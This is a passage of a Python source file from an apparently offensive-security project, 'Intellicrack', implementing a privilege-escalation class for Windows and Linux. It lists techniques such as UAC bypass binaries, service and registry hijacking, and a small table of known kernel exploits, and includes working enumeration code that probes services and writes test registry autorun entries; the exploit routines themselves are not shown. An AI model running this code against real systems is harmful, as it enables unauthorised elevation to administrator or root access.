"""This file is part of Intellicrack.
Copyright (C) 2025 Zachary Flint.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see https://www.gnu.org/licenses/.
"""

import functools
import logging
import os
import platform
import shutil
import subprocess
import tempfile
import time
from typing import Any

# Create module logger
logger = logging.getLogger(__name__)

# Unix-specific imports with graceful fallback
try:
    import grp
    import pwd

    HAS_UNIX_MODULES = True
except ImportError as e:
    import platform

    if platform.system() != "Windows":
        logger.error("Import error in privilege_escalation.py: %s", e)
    grp = None
    pwd = None
    HAS_UNIX_MODULES = False

"""
Privilege Escalation Module

Implements various privilege escalation techniques for Windows and Linux systems
including kernel exploits, service misconfigurations, and permission weaknesses.
"""

try:
    from ...utils.system.os_detection_mixin import OSDetectionMixin

    HAS_OS_DETECTION = True
except ImportError as e:
    logger.error("Import error in privilege_escalation.py: %s", e)
    OSDetectionMixin = object
    HAS_OS_DETECTION = False

try:
    from .base_exploitation import BaseExploitation

    HAS_BASE_EXPLOITATION = True
except ImportError as e:
    logger.error("Import error in privilege_escalation.py: %s", e)
    BaseExploitation = object
    HAS_BASE_EXPLOITATION = False


def handle_escalation_errors(func):
    """Decorator for consistent error handling in escalation methods."""

    @functools.wraps(func)
    def wrapper(self, escalate=False, options=None):
        if options is None:
            options = {}

        try:
            return func(self, escalate, options)
        except subprocess.TimeoutExpired as e:
            result = self.init_result()
            result["timeout"] = True
            result["error"] = f"Operation timed out after {e.timeout} seconds"
            result["error_type"] = "timeout"
            self.handle_result_error(result, e)
            return result
        except subprocess.CalledProcessError as e:
            result = self.init_result()
            result["command_failed"] = True
            result["return_code"] = e.returncode
            result["error"] = f"Command failed with return code {e.returncode}"
            if e.stderr:
                result["stderr"] = e.stderr
            self.handle_result_error(result, e)
            return result
        except (FileNotFoundError, PermissionError) as e:
            result = self.init_result()
            result["access_error"] = True
            self.handle_result_error(result, e)
            return result
        except Exception as e:
            result = self.init_result()
            result["unexpected_error"] = True
            self.handle_result_error(result, e)
            logger.exception("Unexpected error in %s", func.__name__)
            return result

    return wrapper


class PrivilegeEscalation(BaseExploitation, OSDetectionMixin):
    """Cross-platform privilege escalation with multiple techniques."""

    def is_windows(self):
        """Check if running on Windows."""
        if hasattr(super(), "is_windows"):
            return super().is_windows()
        return platform.system() == "Windows"

    def __init__(self):
        """Initialize the privilege escalation system.

        Sets up the privilege escalation framework with platform-specific techniques.
        For Windows: service permissions, registry autoruns, DLL hijacking, token
        impersonation, UAC bypass, kernel exploits. For Linux: sudo misconfigurations,
        SUID binaries, kernel exploits, cron permissions, capabilities, Docker socket.
        """
        super().__init__()
        self.logger = logging.getLogger("IntellicrackLogger.PrivilegeEscalation")

        # Escalation techniques by platform
        self.escalation_techniques = {
            "windows": {
                "unquoted_service_path": self._windows_unquoted_service_path,
                "service_permissions": self._windows_service_permissions,
                "registry_autoruns": self._windows_registry_autoruns,
                "dll_hijacking": self._windows_dll_hijacking,
                "token_impersonation": self._windows_token_impersonation,
                "uac_bypass": self._windows_uac_bypass,
                "kernel_exploit": self._windows_kernel_exploit,
                "scheduled_task_permissions": self._windows_scheduled_task_permissions,
                "always_install_elevated": self._windows_always_install_elevated,
                "weak_file_permissions": self._windows_weak_file_permissions,
                "service_binary_hijacking": self._windows_service_binary_hijacking,
                "com_hijacking": self._windows_com_hijacking,
            },
            "linux": {
                "sudo_misconfiguration": self._linux_sudo_misconfiguration,
                "suid_binaries": self._linux_suid_binaries,
                "kernel_exploit": self._linux_kernel_exploit,
                "cron_permissions": self._linux_cron_permissions,
                "weak_file_permissions": self._linux_weak_file_permissions,
                "library_hijacking": self._linux_library_hijacking,
                "capabilities": self._linux_capabilities,
                "docker_socket": self._linux_docker_socket,
                "environment_variables": self._linux_environment_variables,
                "systemd_permissions": self._linux_systemd_permissions,
                "path_hijacking": self._linux_path_hijacking,
                "nfs_weak_permissions": self._linux_nfs_weak_permissions,
            },
        }

        # Known exploits database
        self.exploits_db = {
            "windows": {
                "MS16-032": {
                    "target_versions": ["Windows 7", "Windows 8", "Windows 10"],
                    "description": "Secondary Logon Handle Privilege Escalation",
                    "reliability": 8,
                },
                "MS17-017": {
                    "target_versions": ["Windows 7", "Windows 8", "Windows 10"],
                    "description": "GDI Palette Objects Local Privilege Escalation",
                    "reliability": 9,
                },
                "CVE-2019-1388": {
                    "target_versions": ["Windows 7", "Windows 8", "Windows 10"],
                    "description": "Windows Certificate Dialog Privilege Escalation",
                    "reliability": 7,
                },
            },
            "linux": {
                "CVE-2016-5195": {
                    "target_versions": ["Linux 2.6.22", "Linux 4.8.3"],
                    "description": "Dirty COW Memory Corruption",
                    "reliability": 9,
                },
                "CVE-2017-16995": {
                    "target_versions": ["Linux 4.4.0", "Linux 4.15"],
                    "description": "eBPF Verifier Memory Corruption",
                    "reliability": 8,
                },
                "CVE-2021-4034": {
                    "target_versions": ["pkexec"],
                    "description": "Polkit pkexec Local Privilege Escalation",
                    "reliability": 9,
                },
            },
        }

        # External tools configuration
        self.external_tools = {
            "windows": {
                "accesschk": {
                    "executable": "accesschk.exe",
                    "description": "SysInternals AccessChk for permission checking",
                    "download_url": "https://download.sysinternals.com/files/AccessChk.zip",
                    "required_for": ["service_permissions"],
                },
                "wmic": {
                    "executable": "wmic.exe",
                    "description": "Windows Management Instrumentation Command-line",
                    "built_in": True,
                    "required_for": ["unquoted_service_path", "always_install_elevated"],
                },
                "sc": {
                    "executable": "sc.exe",
                    "description": "Service Control Manager",
                    "built_in": True,
                    "required_for": ["service_permissions", "service_binary_hijacking"],
                },
                "reg": {
                    "executable": "reg.exe",
                    "description": "Registry manipulation tool",
                    "built_in": True,
                    "required_for": ["registry_autoruns", "always_install_elevated"],
                },
                "schtasks": {
                    "executable": "schtasks.exe",
                    "description": "Scheduled tasks management",
                    "built_in": True,
                    "required_for": ["scheduled_task_permissions"],
                },
            },
            "linux": {
                "sudo": {
                    "executable": "sudo",
                    "description": "Superuser do",
                    "built_in": True,
                    "required_for": ["sudo_misconfiguration"],
                },
                "find": {
                    "executable": "find",
                    "description": "File system search",
                    "built_in": True,
                    "required_for": ["suid_binaries", "weak_file_permissions"],
                },
                "gcc": {
                    "executable": "gcc",
                    "description": "GNU Compiler Collection",
                    "package": "build-essential",
                    "required_for": ["kernel_exploit", "library_hijacking"],
                },
                "getcap": {
                    "executable": "getcap",
                    "description": "Get file capabilities",
                    "package": "libcap2-bin",
                    "required_for": ["capabilities"],
                },
                "docker": {
                    "executable": "docker",
                    "description": "Docker container runtime",
                    "package": "docker.io",
                    "required_for": ["docker_socket"],
                },
            },
        }

        # Track tool availability
        self._tool_availability_cache = {}
        self._check_tools_on_init()

    def _check_tools_on_init(self):
        """Check availability of external tools on initialization."""
        os_type = self._detect_os()
        if os_type in self.external_tools:
            for tool_name, tool_info in self.external_tools[os_type].items():
                if tool_info.get("built_in", False):
                    # Assume built-in tools are available
                    self._tool_availability_cache[tool_name] = True
                else:
                    # Check if tool is available
                    self._tool_availability_cache[tool_name] = self._check_tool_available(
                        tool_info["executable"],
                    )
                    if not self._tool_availability_cache[tool_name]:
                        self.logger.warning(
                            "External tool not available: %s (%s)",
                            tool_name,
                            tool_info["description"],
                        )

    def _check_tool_available(self, tool_executable: str) -> bool:
        """Check if an external tool is available on the system.

        Args:
            tool_executable: Name or path of the tool executable

        Returns:
            True if tool is available, False otherwise

        """
        try:
            if platform.system() == "Windows":
                # Check using where command
                check_cmd = ["where", tool_executable]
            else:
                # Check using which command
                check_cmd = ["which", tool_executable]

            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                check_cmd,
                check=False,
                capture_output=True,
                text=True,
                timeout=5,
                shell=False
            )

            return result.returncode == 0

        except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
            self.logger.debug("Tool check failed for %s: %s", tool_executable, e)
            return False

    def _ensure_tool_available(self, tool_name: str) -> bool:
        """Ensure a required tool is available before using it.

        Args:
            tool_name: Name of the tool from external_tools configuration

        Returns:
            True if tool is available, False otherwise

        """
        # Check cache first
        if tool_name in self._tool_availability_cache:
            return self._tool_availability_cache[tool_name]

        # Get tool info
        os_type = self._detect_os()
        if os_type not in self.external_tools:
            return False

        tool_info = self.external_tools[os_type].get(tool_name)
        if not tool_info:
            return False

        # Check availability
        available = self._check_tool_available(tool_info["executable"])
        self._tool_availability_cache[tool_name] = available

        if not available:
            self.logger.warning(
                "Required tool not available: %s (%s)",
                tool_name,
                tool_info["description"],
            )

            # Provide installation guidance
            if "download_url" in tool_info:
                self.logger.info(
                    "Download %s from: %s",
                    tool_name,
                    tool_info["download_url"],
                )
            elif "package" in tool_info:
                self.logger.info(
                    "Install %s using package manager: %s",
                    tool_name,
                    tool_info["package"],
                )

        return available

    def get_missing_tools(self, techniques: list[str] | None = None) -> dict[str, list[str]]:
        """Get list of missing tools required for specific techniques.

        Args:
            techniques: List of technique names to check, or None for all

        Returns:
            Dictionary mapping techniques to lists of missing tools

        """
        missing_tools = {}
        os_type = self._detect_os()

        if os_type not in self.external_tools:
            return missing_tools

        # Get techniques to check
        if techniques is None:
            techniques = list(self.escalation_techniques.get(os_type, {}).keys())

        # Check each technique
        for technique in techniques:
            technique_missing = []

            # Find tools required for this technique
            for tool_name, tool_info in self.external_tools[os_type].items():
                if technique in tool_info.get("required_for", []):
                    if not self._tool_availability_cache.get(tool_name, False):
                        technique_missing.append(tool_name)

            if technique_missing:
                missing_tools[technique] = technique_missing

        return missing_tools

    def init_result(self, details=None):
        """Initialize a standard result dictionary."""
        if details is None:
            details = {}
        return {
            "success": False,
            "error": None,
            "details": details,
            "timestamp": time.time(),
        }

    def handle_result_error(self, result, error):
        """Handle and log error in result with categorization."""
        result["success"] = False
        result["error"] = str(error)

        # Categorize error type
        error_type = type(error).__name__

        if isinstance(error, FileNotFoundError):
            result["error_type"] = "file_not_found"
            result["error_category"] = "resource"
            result["recovery_suggestion"] = "Check file paths and ensure required files exist"
        elif isinstance(error, PermissionError):
            result["error_type"] = "permission_denied"
            result["error_category"] = "access"
            result["recovery_suggestion"] = "Run with elevated privileges or check file permissions"
        elif isinstance(error, subprocess.TimeoutExpired):
            result["error_type"] = "timeout"
            result["error_category"] = "execution"
            result["recovery_suggestion"] = "Increase timeout or check if process is hanging"
        elif isinstance(error, subprocess.CalledProcessError):
            result["error_type"] = "command_failed"
            result["error_category"] = "execution"
            result["recovery_suggestion"] = f"Command failed with return code {error.returncode}"
        elif isinstance(error, OSError):
            result["error_type"] = "os_error"
            result["error_category"] = "system"
            result["recovery_suggestion"] = "Check system resources and compatibility"
        elif isinstance(error, ValueError):
            result["error_type"] = "value_error"
            result["error_category"] = "validation"
            result["recovery_suggestion"] = "Check input parameters and data format"
        else:
            result["error_type"] = error_type
            result["error_category"] = "unknown"
            result["recovery_suggestion"] = "Check logs for detailed error information"

        # Log with appropriate level based on error category
        if result["error_category"] in ["access", "resource"]:
            self.logger.warning(
                "Privilege escalation %s error: %s", result["error_category"], error
            )
        else:
            self.logger.error("Privilege escalation %s error: %s", result["error_category"], error)

        # Audit log the error
        from ..logging.audit_logger import log_exploit_attempt

        log_exploit_attempt(
            target=result.get("target", "unknown"),
            exploit_type=result.get("exploit_type", "privilege_escalation"),
            success=False,
            error=str(error),
        )

    def _is_linux(self):
        """Check if current platform is Linux."""
        return platform.system().lower() == "linux"

    def _is_windows(self):
        """Check if current platform is Windows."""
        return platform.system().lower() == "windows"

    def safe_command_execution(self, command, timeout=30, retries=3, shell=False):
        """Execute command with retries and comprehensive error handling."""
        last_error = None

        for attempt in range(retries):
            try:
                if attempt > 0:
                    self.logger.info(
                        "Retrying command execution (attempt %d/%d)", attempt + 1, retries
                    )
                    time.sleep(2**attempt)  # Exponential backoff

                process = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    command,
                    check=False,
                    shell=shell,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                )

                if process.returncode == 0:
                    return {
                        "success": True,
                        "stdout": process.stdout,
                        "stderr": process.stderr,
                        "returncode": process.returncode,
                    }
                # Command failed but didn't raise exception
                last_error = subprocess.CalledProcessError(
                    process.returncode,
                    command,
                    process.stdout,
                    process.stderr,
                )

            except subprocess.TimeoutExpired as e:
                last_error = e
                self.logger.warning("Command timed out after %d seconds", timeout)

            except Exception as e:
                last_error = e
                self.logger.error("Command execution failed: %s", e)

        # All retries failed
        return {
            "success": False,
            "error": str(last_error),
            "error_type": type(last_error).__name__,
            "attempts": retries,
        }

    def validate_exploit_result(self, result, expected_privileges=None):
        """Validate exploit execution result and check for privilege escalation."""
        if not result.get("success", False):
            return False

        # Check for common privilege escalation indicators
        indicators = [
            "root",
            "administrator",
            "system",
            "nt authority\\system",
            "uid=0",
            "gid=0",
            "elevated",
            "privilege",
        ]

        output = str(result.get("stdout", "")).lower() + str(result.get("stderr", "")).lower()

        # Check for privilege indicators in output
        for indicator in indicators:
            if indicator in output:
                self.logger.info("Privilege escalation indicator found: %s", indicator)
                result["privilege_gained"] = True
                result["privilege_indicator"] = indicator
                return True

        # Check specific expected privileges if provided
        if expected_privileges:
            for privilege in expected_privileges:
                if privilege.lower() in output:
                    result["privilege_gained"] = True
                    result["privilege_indicator"] = privilege
                    return True

        # Additional validation for Windows
        if self._is_windows() and "whoami /priv" in str(result.get("command", "")):
            if "SeDebugPrivilege" in output and "Enabled" in output:
                result["privilege_gained"] = True
                result["privilege_indicator"] = "SeDebugPrivilege"
                return True

        return False

    def analyze_escalation_opportunities(self, target_os: str | None = None) -> dict[str, Any]:
        """Analyze system for privilege escalation opportunities.

        Args:
            target_os: Target operating system ('windows', 'linux', or None for auto-detect)

        Returns:
            Analysis results with identified opportunities

        """
        result = {
            "target_os": target_os or self._detect_os(),
            "current_privileges": self._get_current_privileges(),
            "opportunities": [],
            "exploits": [],
            "recommendations": [],
            "scan_timestamp": time.time(),
        }

        try:
            self.logger.info("Analyzing privilege escalation opportunities")

            os_type = result["target_os"]

            if os_type not in self.escalation_techniques:
                result["error"] = f"Unsupported OS: {os_type}"
                return result

            # Scan for each technique
            techniques = self.escalation_techniques[os_type]

            for technique_name, technique_func in techniques.items():
                self.logger.debug("Scanning for %s", technique_name)

                try:
                    opportunity = technique_func()

                    if opportunity and opportunity.get("vulnerable", False):
                        opportunity["technique"] = technique_name
                        opportunity["discovered_at"] = time.time()
                        result["opportunities"].append(opportunity)

                        self.logger.info("Found opportunity: %s", technique_name)

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                ) as e:
                    self.logger.debug("Error scanning %s: %s", technique_name, e)

            # Check for known exploits
            result["exploits"] = self._check_known_exploits(os_type)

            # Generate recommendations
            result["recommendations"] = self._generate_recommendations(result)

            self.logger.info(
                "Analysis complete: %s opportunities found", len(result["opportunities"])
            )
            return result

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            self.logger.error("Escalation analysis failed: %s", e)
            result["error"] = str(e)
            return result

    def attempt_escalation(
        self, technique: str, target_os: str | None = None, options: dict[str, Any] | None = None
    ) -> dict[str, Any]:
        """Attempt privilege escalation using specified technique.

        Args:
            technique: Escalation technique to use
            target_os: Target operating system
            options: Technique-specific options

        Returns:
            Results of escalation attempt

        """
        result = {
            "success": False,
            "technique": technique,
            "target_os": target_os or self._detect_os(),
            "initial_privileges": self._get_current_privileges(),
            "final_privileges": None,
            "details": {},
            "error": None,
        }

        if options is None:
            options = {}

        try:
            self.logger.info("Attempting privilege escalation: %s", technique)

            os_type = result["target_os"]

            if os_type not in self.escalation_techniques:
                result["error"] = f"Unsupported OS: {os_type}"
                return result

            if technique not in self.escalation_techniques[os_type]:
                result["error"] = f"Unknown technique: {technique}"
                return result

            # Execute escalation technique
            technique_func = self.escalation_techniques[os_type][technique]
            escalation_result = technique_func(escalate=True, options=options)

            if escalation_result and escalation_result.get("success", False):
                result["success"] = True
                result["details"] = escalation_result.get("details", {})
                result["final_privileges"] = self._get_current_privileges()

                self.logger.info("Escalation successful: %s", technique)
            else:
                result["error"] = escalation_result.get("error", "Escalation failed")
                self.logger.warning("Escalation failed: %s", technique)

            return result

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            self.logger.error("Escalation attempt failed: %s", e)
            result["error"] = str(e)
            return result

    def _get_current_privileges(self) -> dict[str, Any]:
        """Get current privilege level and details."""
        privileges = {
            "user": None,
            "groups": [],
            "is_admin": False,
            "is_root": False,
            "effective_uid": None,
            "real_uid": None,
        }

        try:
            if platform.system().lower() == "windows":
                # Windows privilege checking
                import ctypes

                privileges["is_admin"] = ctypes.windll.shell32.IsUserAnAdmin() != 0
                privileges["user"] = os.environ.get("USERNAME", "Unknown")

            else:
                # Unix-like privilege checking
                if hasattr(os, "geteuid") and hasattr(os, "getuid"):
                    privileges["effective_uid"] = os.geteuid()
                    privileges["real_uid"] = os.getuid()
                    privileges["is_root"] = privileges["effective_uid"] == 0
                else:
                    privileges["effective_uid"] = -1
                    privileges["real_uid"] = -1
                    privileges["is_root"] = False
                privileges["user"] = os.environ.get("USER", "Unknown")

                # Get group information
                if HAS_UNIX_MODULES and grp and pwd:
                    try:
                        user_info = pwd.getpwuid(privileges["real_uid"])
                        privileges["username"] = user_info.pw_name
                        privileges["home_dir"] = user_info.pw_dir
                        privileges["shell"] = user_info.pw_shell
                        if hasattr(os, "getgroups") and grp is not None:
                            try:
                                # getgroups() is Unix-specific, not available on Windows
                                group_ids = getattr(os, "getgroups", list)()
                                groups = [grp.getgrgid(gid).gr_name for gid in group_ids]
                            except (OSError, KeyError, AttributeError) as e:
                                logger.error(
                                    "(OSError, KeyError, AttributeError) in privilege_escalation.py: %s",
                                    e,
                                )
                                groups = []
                        else:
                            groups = []
                        privileges["groups"] = groups

                    except (
                        FileNotFoundError,
                        PermissionError,
                        OSError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                        subprocess.SubprocessError,
                    ) as e:
                        logger.error(
                            "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                            e,
                        )
                        privileges["groups"] = []
                else:
                    privileges["groups"] = []

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            self.logger.debug("Error getting privileges: %s", e)

        return privileges

    def _check_known_exploits(self, target_os: str) -> list[dict[str, Any]]:
        """Check for known exploits applicable to the system."""
        applicable_exploits = []

        if target_os not in self.exploits_db:
            return applicable_exploits

        try:
            # Get system version information
            if target_os == "windows":
                version_info = self._get_windows_version()
            else:
                version_info = self._get_linux_version()

            # Check each exploit
            for exploit_id, exploit_info in self.exploits_db[target_os].items():
                if self._is_exploit_applicable(version_info, exploit_info):
                    applicable_exploits.append(
                        {
                            "exploit_id": exploit_id,
                            "description": exploit_info["description"],
                            "reliability": exploit_info["reliability"],
                            "target_versions": exploit_info["target_versions"],
                        }
                    )

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            self.logger.debug("Error checking exploits: %s", e)

        return applicable_exploits

    def _check_token_privilege(self, privilege_name: str) -> bool:
        """Check if current process has a specific privilege."""
        try:
            if platform.system() == "Windows":
                import ctypes
                from ctypes import wintypes

                # Get current process token
                kernel32 = ctypes.windll.kernel32
                advapi32 = ctypes.windll.advapi32

                token = wintypes.HANDLE()
                if not kernel32.OpenProcessToken(
                    kernel32.GetCurrentProcess(),
                    0x0008,  # TOKEN_QUERY
                    ctypes.byref(token),
                ):
                    return False

                # Check for privilege using ADVAPI32
                try:
                    # Define TOKEN_PRIVILEGES structure
                    class LUID(ctypes.Structure):
                        _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]

                    class LUID_AND_ATTRIBUTES(ctypes.Structure):  # noqa: N801
                        _fields_ = [("Luid", LUID), ("Attributes", wintypes.DWORD)]

                    class TOKEN_PRIVILEGES(ctypes.Structure):  # noqa: N801
                        _fields_ = [
                            ("PrivilegeCount", wintypes.DWORD),
                            ("Privileges", LUID_AND_ATTRIBUTES * 1),
                        ]

                    # Lookup privilege LUID using ADVAPI32
                    privilege_luid = LUID()
                    result = advapi32.LookupPrivilegeValueW(
                        None,  # Local system
                        privilege_name,
                        ctypes.byref(privilege_luid),
                    )

                    if not result:
                        kernel32.CloseHandle(token)
                        return False

                    # Get token privileges using ADVAPI32
                    token_privs = TOKEN_PRIVILEGES()
                    return_length = wintypes.DWORD()

                    # Query token for privilege information
                    if advapi32.GetTokenInformation(
                        token,
                        3,  # TokenPrivileges
                        ctypes.byref(token_privs),
                        ctypes.sizeof(token_privs),
                        ctypes.byref(return_length),
                    ):
                        # Check if our privilege LUID exists in token
                        for i in range(token_privs.PrivilegeCount):
                            if (
                                token_privs.Privileges[i].Luid.LowPart == privilege_luid.LowPart
                                and token_privs.Privileges[i].Luid.HighPart
                                == privilege_luid.HighPart
                            ):
                                kernel32.CloseHandle(token)
                                return True

                    kernel32.CloseHandle(token)
                    return False

                except Exception:
                    kernel32.CloseHandle(token)
                    # Fallback to simple check
                    common_privs = ["SeDebugPrivilege", "SeImpersonatePrivilege"]
                    return privilege_name in common_privs
            else:
                # Linux privilege check
                import os

                if privilege_name == "CAP_SYS_ADMIN":
                    return os.geteuid() == 0
                return False
        except Exception as e:
            self.logger.debug(f"Failed to check privilege {privilege_name}: {e}")
            return False

    def _check_uac_bypass_availability(self, method: str) -> bool:
        """Check if a specific UAC bypass method is available."""
        try:
            if platform.system() != "Windows":
                return False

            # Check for specific bypass method availability
            bypass_checks = {
                "fodhelper": lambda: os.path.exists(r"C:\Windows\System32\fodhelper.exe"),
                "eventvwr": lambda: os.path.exists(r"C:\Windows\System32\eventvwr.exe"),
                "computerdefaults": lambda: os.path.exists(
                    r"C:\Windows\System32\ComputerDefaults.exe"
                ),
                "sdclt": lambda: os.path.exists(r"C:\Windows\System32\sdclt.exe"),
                "slui": lambda: os.path.exists(r"C:\Windows\System32\slui.exe"),
                "perfmon": lambda: os.path.exists(r"C:\Windows\System32\perfmon.exe"),
            }

            if method in bypass_checks:
                return bypass_checks[method]()

            return False
        except Exception as e:
            self.logger.debug(f"Failed to check UAC bypass availability for {method}: {e}")
            return False

    def _generate_recommendations(self, analysis: dict[str, Any]) -> list[dict[str, Any]]:
        """Generate escalation recommendations based on analysis."""
        recommendations = []

        # Sort opportunities by likelihood of success
        opportunities = sorted(
            analysis["opportunities"],
            key=lambda x: x.get("success_probability", 0),
            reverse=True,
        )

        for opportunity in opportunities[:5]:  # Top 5 recommendations
            recommendations.append(
                {
                    "technique": opportunity["technique"],
                    "success_probability": opportunity.get("success_probability", 0),
                    "stealth_level": opportunity.get("stealth_level", "medium"),
                    "complexity": opportunity.get("complexity", "medium"),
                    "description": opportunity.get("description", ""),
                    "requirements": opportunity.get("requirements", []),
                }
            )

        return recommendations

    # Windows escalation techniques

    def _windows_unquoted_service_path(self, escalate=False, options=None):
        """Check for unquoted service path vulnerability."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "services": [],
            "success_probability": 0.7,
            "stealth_level": "medium",
            "complexity": "low",
        }

        # Check if wmic is available
        if not self._ensure_tool_available("wmic"):
            result["error"] = "wmic.exe not available on this system"
            return result

        try:
            # Query services for unquoted paths
            # Get service information
            wmic_path = shutil.which("wmic")
            if not wmic_path:
                result["error"] = "wmic command not found in PATH"
                return result

            wmic_proc = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                [wmic_path, "service", "get", "name,displayname,pathname,startmode"],
                check=False, capture_output=True, text=True, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            if wmic_proc.returncode == 0:
                # Filter for auto services
                findstr_path = shutil.which("findstr")
                if not findstr_path:
                    result["error"] = "findstr command not found in PATH"
                    return result

                findstr1 = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    [findstr_path, "/i", "auto"], input=wmic_proc.stdout,
                    capture_output=True, text=True, shell=False  # Explicitly secure - using list format prevents shell injection
                )
                if findstr1.returncode == 0:
                    # Exclude Windows services
                    findstr2 = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        [findstr_path, "/i", "/v", "c:\\windows\\"], input=findstr1.stdout,
                        capture_output=True, text=True, shell=False  # Explicitly secure - using list format prevents shell injection
                    )
                    if findstr2.returncode == 0:
                        # Final filter to exclude quotes
                        process = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                            [findstr_path, "/i", "/v", '"""'], input=findstr2.stdout,
                            capture_output=True, text=True, shell=False  # Explicitly secure - using list format prevents shell injection
                        )
                    else:
                        process = findstr2
                else:
                    process = findstr1
            else:
                process = wmic_proc

            if process.returncode == 0 and process.stdout.strip():
                services = []
                lines = process.stdout.strip().split("\n")

                for line in lines[1:]:  # Skip header
                    if line.strip():
                        parts = line.split()
                        if len(parts) >= 3:
                            services.append(
                                {
                                    "name": parts[1],
                                    "path": " ".join(parts[2:]),
                                    "start_mode": parts[0],
                                }
                            )

                if services:
                    result["vulnerable"] = True
                    result["services"] = services
                    result["description"] = f"Found {len(services)} services with unquoted paths"

                    if escalate:
                        # Attempt exploitation
                        return self._exploit_unquoted_service_path(services[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            self.handle_result_error(result, e)

        return result

    def _windows_service_permissions(self, escalate=False, options=None):
        """Check for weak service permissions."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "services": [],
            "success_probability": 0.8,
            "stealth_level": "low",
            "complexity": "medium",
        }

        # Check if required tools are available
        if not self._ensure_tool_available("accesschk"):
            result["error"] = "accesschk.exe not available - download from SysInternals"
            return result

        try:
            # Check service permissions with accesschk
            cmd = ["accesschk.exe", "-uwcqv", "Authenticated Users", "*"]

            process = subprocess.run(cmd, check=False, capture_output=True, text=True, stderr=subprocess.DEVNULL, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

            if process.returncode == 0 and process.stdout.strip():
                vulnerable_services = []
                lines = process.stdout.strip().split("\n")

                for line in lines:
                    if "SERVICE_CHANGE_CONFIG" in line or "SERVICE_ALL_ACCESS" in line:
                        service_name = line.split()[0]
                        vulnerable_services.append(
                            {
                                "name": service_name,
                                "permissions": line.strip(),
                            }
                        )

                if vulnerable_services:
                    result["vulnerable"] = True
                    result["services"] = vulnerable_services
                    result["description"] = (
                        f"Found {len(vulnerable_services)} services with weak permissions"
                    )

                    if escalate:
                        return self._exploit_service_permissions(vulnerable_services[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError) in privilege_escalation.py: %s",
                e,
            )
            self.handle_result_error(result, e)

        return result

    def _windows_registry_autoruns(self, escalate=False, options=None):
        """Check for registry autorun vulnerabilities."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "keys": [],
            "success_probability": 0.6,
            "stealth_level": "high",
            "complexity": "low",
        }

        try:
            # Check common autorun registry keys
            autorun_keys = [
                r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
                r"HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce",
            ]

            vulnerable_keys = []

            for key in autorun_keys:
                # Check write permissions
                reg_path = shutil.which("reg")
                if not reg_path:
                    continue
                process = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    [reg_path, "query", key], check=False, capture_output=True, text=True, stderr=subprocess.DEVNULL, shell=False  # Explicitly secure - using list format prevents shell injection
                )

                if process.returncode == 0:
                    # Try to add a test value
                    test_process = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        [reg_path, "add", key, "/v", "TestEntry", "/d", "test", "/f"],
                        check=False, capture_output=True, text=True, stderr=subprocess.DEVNULL, shell=False  # Explicitly secure - using list format prevents shell injection
                    )

                    if test_process.returncode == 0:
                        vulnerable_keys.append(
                            {
                                "key": key,
                                "writable": True,
                            }
                        )

                        # Clean up test entry
                        subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                            [reg_path, "delete", key, "/v", "TestEntry", "/f"],
                            check=False, stderr=subprocess.DEVNULL, shell=False  # Explicitly secure - using list format prevents shell injection
                        )

            if vulnerable_keys:
                result["vulnerable"] = True
                result["keys"] = vulnerable_keys
